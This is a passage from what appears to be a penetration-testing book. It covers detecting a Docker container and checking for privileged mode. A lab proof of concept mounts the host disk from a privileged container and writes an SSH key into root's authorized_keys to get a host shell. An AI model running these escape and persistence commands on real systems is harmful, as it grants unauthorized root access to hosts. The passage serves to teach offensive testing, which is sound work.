    Listing 6-6: Listing attributes of the process bearing PID 1 in the /proc folder


    We could keep going, but it is pretty clear from the mentions of Docker in the
    cgroup names and mount points that we are trapped inside a container. Plus, in
    a typical modern Linux system, the command starting the first process should be
    akin to /sbin/init or /usr/lib/systemd, not /bin/sh.


    Being root inside a container still gives us the power to install packages and
    access root-protected files, mind you, but we can only exert that power over resources
    belonging to our narrow and very limited namespace.


    One of the very first reflexes to have when landing in a container is to check
    whether it is running in privileged mode.


    # Checking for Privileged Mode


    In privileged execution mode, Docker merely acts as a packaging environment: it
    maintains the namespace isolation but grants wide access to all device files,
    like the hard drive, as well as all the Linux capabilities (more on that in the
    next section).


    The container can therefore alter any resource on the host system, such as the
    kernel features, hard drive, network, and so on. If we find we’re in privileged
    mode, we can just mount the main partition, slip an SSH key in any home folder,
    and open a new admin shell on the host. Here’s a quick proof of concept of just
    that in the lab for illustration purposes:


    ```

    # Demo lab

    root@DemoContainer:# ls /dev

    autofs      kmsg        ppp         tty10

    bsg         lightnvm    psaux       tty11

    --snip--

    # tty devices are usually filtered out by cgroups, so we must be inside a privileged
    container


    root@DemoContainer:# fdisk -l

    Disk /dev/dm-0: 23.3 GiB, 25004189184 bytes, 48914432 sectors

    Units: sectors of 1 * 512 = 512 bytes

    --snip--


    # mount the host''s main partition

    root@DemoContainer:# mount /dev/dm-0 /mnt && ls /mnt

    bin  dev  home  lib  lost+found  mnt  proc...


    # inject our SSH key into the root home folder

    root@DemoContainer:# echo "ssh-rsa AAAAB3NzaC1yc2EA..." > /mnt/root/.ssh/authorized_keys

    ```'
